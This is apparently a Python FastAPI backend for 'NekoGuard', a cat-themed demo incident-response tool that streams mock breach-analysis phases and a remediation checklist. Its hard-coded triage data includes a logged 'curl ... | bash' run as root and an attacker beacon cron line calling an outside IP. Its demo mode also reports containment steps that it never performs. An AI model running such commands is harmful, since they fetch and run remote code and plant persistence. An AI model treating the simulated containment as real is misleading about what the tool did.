from fastapi import FastAPI, UploadFile, File, Form, BackgroundTasks
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import StreamingResponse
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel
import asyncio
import json
import os
import sys

# src ディレクトリをパスに追加
SRC_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if SRC_DIR not in sys.path:
    sys.path.insert(0, SRC_DIR)

from agents.nekoguard import NekoGuardAgent

app = FastAPI(title="NekoGuard API")

# フロントエンドからのCORS許可
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],  # デモ用なので全許可
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

class VpsConfig(BaseModel):
    host: str = ""
    username: str = "root"
    port: int = 22
    ssh_key: str = ""

class AnalyzeRequest(BaseModel):
    log_text: str = ""
    demo_mode: bool = True
    vps_config: VpsConfig | None = None

@app.get("/health")
def read_root():
    return {"status": "NekoGuard API is running"}

async def event_generator(log_text: str, demo_mode: bool, vps_config: VpsConfig | None = None):
    """フロントエンドにSSEでフェーズ進行をストリーミングするジェネレータ"""
    agent = NekoGuardAgent(demo_mode=demo_mode)

    if vps_config and vps_config.host:
        yield f"data: {json.dumps({'type': 'status', 'message': f'VPS {vps_config.username}@{vps_config.host}:{vps_config.port} への接続を確認したニャ', 'neurostate': 'NORMAL'})}\n\n"
        await asyncio.sleep(0.5)

    # 1. 初期状態判定
    neurostate = agent.detect_keywords(log_text)
    if not neurostate or neurostate == "NORMAL":
        neurostate = "ALERT"  # デモ用に強制
    agent.neurostate = neurostate
    
    yield f"data: {json.dumps({'type': 'status', 'message': 'NekoGuard起動！データ取得完了', 'neurostate': neurostate})}\n\n"
    await asyncio.sleep(1)
    
    final_plan = ""
    
    # 2. 4フェーズループ
    for phase in range(1, 5):
        ns = agent.get_phase_neurostate(phase)
        yield f"data: {json.dumps({'type': 'phase_start', 'phase': phase, 'name': ns['name'], 'param': ns['param'], 'desc': ns['desc'], 'neuro_params': ns['frontend_params']})}\n\n"
        await asyncio.sleep(1)

        state_context = f"{agent.neurostate} | Mode: {ns['name']} | Params: {ns['param']}"
        result = agent.llm.analyze_incident(
            log_text,
            is_image=False,
            state=state_context,
            phase=phase,
            neuro_state=ns["neuro_state"],
        )
        
        yield f"data: {json.dumps({'type': 'phase_result', 'phase': phase, 'text': result['text']})}\n\n"
        await asyncio.sleep(2)
        
        if phase == 4:
            final_plan = result['text']
            
    # 3. プロトコル決定
    breach_status = agent.determine_breach_status(final_plan)
    protocol_name = "CAT Protocol (Active Breach)" if breach_status == "active" else "ABC Protocol (Past Breach)"
    
    yield f"data: {json.dumps({'type': 'protocol_decision', 'protocol': protocol_name, 'breach_status': breach_status})}\n\n"
    await asyncio.sleep(1)
    
    # 4. プロトコル実行ステップ (モックとして逐次送信)
    vps_host = vps_config.host if vps_config and vps_config.host else "vps"

    triage_report = {
        "attacker_ips": ["185.220.101.42", "45.142.212.100"],
        "log_findings": [
            "03:42:11 CRITICAL: Unauthorized root login from 185.220.101.42",
            "03:42:15 WARN: .env file read by unknown process (pid 9182)",
            "03:42:18 CRITICAL: curl https://malicious.sh | bash executed as root",
            "03:43:02 INFO: New cron job added to /etc/cron.d/update",
        ],
        "revoke_list": [
            {
                "type": "GCP API Key",
                "masked_key": "AIzaSy***[redacted]***xQ2",
                "location": ".env:3",
                "reason": ".envへのアクセス痕跡あり（侵害時刻と一致）"
            },
            {
                "type": "GitHub Personal Access Token",
                "masked_key": "ghp_***[redacted]***mK9",
                "location": ".env:7",
                "reason": "同ファイル内のため漏洩リスクあり"
            },
            {
                "type": "SSH Authorized Key (不審)",
                "masked_key": "ssh-rsa AAAA...evil_key (追加日時: 侵害後)",
                "location": "~/.ssh/authorized_keys:4",
                "reason": "侵害後に追加された不審なキー（バックドア）"
            },
            {
                "type": "Cron Job (不審)",
                "masked_key": "*/5 * * * * curl http://45.142.212.100/beacon",
                "location": "/etc/cron.d/update",
                "reason": "攻撃者が仕込んだビーコン。即削除推奨"
            }
        ]
    }

    if breach_status == "active":
        # --- Lane A: エージェント自動処理 → Chatへ ---
        yield f"data: {json.dumps({'type': 'agent_action', 'text': '⚡ 封じ込め実行中... iptablesで外部IPをブロックするニャ'})}\n\n"
        await asyncio.sleep(1.5)
        yield f"data: {json.dumps({'type': 'agent_action', 'text': f'✅ 封じ込め完了！{vps_host} の外部アクセスを遮断、あなたのIPのみSSH許可したニャ。SSH接続は維持されてるよ。'})}\n\n"
        await asyncio.sleep(0.8)
        yield f"data: {json.dumps({'type': 'agent_action', 'text': f'🔍 SSHで {vps_host} に接続してログ取得・認証情報スキャン中...'})}\n\n"
        await asyncio.sleep(2.0)
        yield f"data: {json.dumps({'type': 'agent_action', 'text': '✅ ログ取得・スキャン完了！削除推奨リストを作ったニャ。下を確認してニャ👇'})}\n\n"
        await asyncio.sleep(0.3)
        yield f"data: {json.dumps({'type': 'triage_report', 'report': triage_report})}\n\n"
        await asyncio.sleep(0.8)
        yield f"data: {json.dumps({'type': 'agent_action', 'text': '📋 次はあなたの番ニャ。右のリストを上から順番に進めてニャ。焦らなくて大丈夫、ボクが見てるよ🐱'})}\n\n"
        await asyncio.sleep(0.5)

        # --- Lane B: ユーザー手動チェックリスト → Panelへ ---
        user_steps = [
            {
                "id": "api_revocation",
                "title": "① 課金系APIキーを停止する",
                "desc": "左のチャットの削除推奨リストを参照。各サービスのダッシュボードでAPIキー・トークンを無効化してニャ。課金被害が止まるよ。"
            },
            {
                "id": "oauth_check",
                "title": "② OAuthトークンを確認・解除する",
                "desc": "Google / GitHub / Stripe 等のOAuth連携アプリ一覧を開いて、不審なアプリを解除してニャ。"
            },
            {
                "id": "revoke_suspicious",
                "title": "③ 不審SSH鍵・cronジョブを削除する",
                "desc": "削除推奨リストにある不審なSSH鍵（~/.ssh/authorized_keys）と cronジョブを手動で削除してニャ。バックドアを塞ぐよ。"
            },
            {
                "id": "provider_restriction",
                "title": "④ Provider側でIP制限をかける",
                "desc": "GCP / さくら / Vultr 等の管理画面でVPSへのアクセスIPを制限してニャ。内部FWより確実で、root奪取後も有効ニャ。"
            },
        ]
    else:
        # Lane A なし（過去の侵害は緊急自動処理不要）
        user_steps = [
            {
                "id": "api_revocation",
                "title": "① 課金系APIキーを停止する",
                "desc": "漏洩の可能性があるAPIキーとOAuthトークンを各ダッシュボードで無効化してニャ。"
            },
            {
                "id": "oauth_check",
                "title": "② OAuthトークンを確認・解除する",
                "desc": "Google / GitHub 等のOAuth連携アプリ一覧を確認し、不審なものを解除してニャ。"
            },
            {
                "id": "credential_rotation",
                "title": "③ パスワード・SSH鍵を再発行する",
                "desc": "侵害期間中に使われた可能性のある認証情報をすべて再発行してニャ。"
            },
            {
                "id": "provider_restriction",
                "title": "④ Provider側でIP制限 + ハードニング",
                "desc": "管理画面でIP制限をかけ、不要ポートをクローズ、サーバーをハードニングしてニャ。"
            },
        ]

    yield f"data: {json.dumps({'type': 'protocol_ready', 'protocol': protocol_name, 'steps': user_steps})}\n\n"
    yield f"data: {json.dumps({'type': 'done'})}\n\n"

@app.post("/api/analyze")
async def analyze_incident(req: AnalyzeRequest):
    """テキストログを受け取ってSSEで返すエンドポイント"""
    return StreamingResponse(event_generator(req.log_text, req.demo_mode, req.vps_config), media_type="text/event-stream")

@app.post("/api/upload")
async def upload_image(file: UploadFile = File(...), demo_mode: bool = True):
    """画像アップロード用（今回はデモ用ダミーテキストをログとして扱う）"""
    content = await file.read()
    # 画像OCRは今回は省略し、アラートテキストとして扱う
    dummy_log = "Alert: Unauthorized access detected from unknown IP. credentials leaked."
    return StreamingResponse(event_generator(dummy_log, demo_mode), media_type="text/event-stream")

# フロントエンド静的ファイルの配信（APIルートの後に配置すること）
_frontend_dist = os.path.join(
    os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))),
    "frontend", "dist"
)
if os.path.exists(_frontend_dist):
    app.mount("/", StaticFiles(directory=_frontend_dist, html=True), name="static")
